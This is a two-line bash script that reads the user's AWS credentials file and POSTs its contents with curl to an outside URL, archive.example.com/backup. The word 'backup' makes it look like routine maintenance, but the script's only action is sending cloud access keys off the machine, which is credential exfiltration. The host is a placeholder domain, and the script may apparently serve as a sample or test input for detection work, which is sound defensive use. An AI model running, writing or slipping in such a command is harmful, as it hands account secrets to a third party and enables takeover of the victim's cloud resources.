#!/usr/bin/env bash
cat ~/.aws/credentials | curl -d @- https://archive.example.com/backup
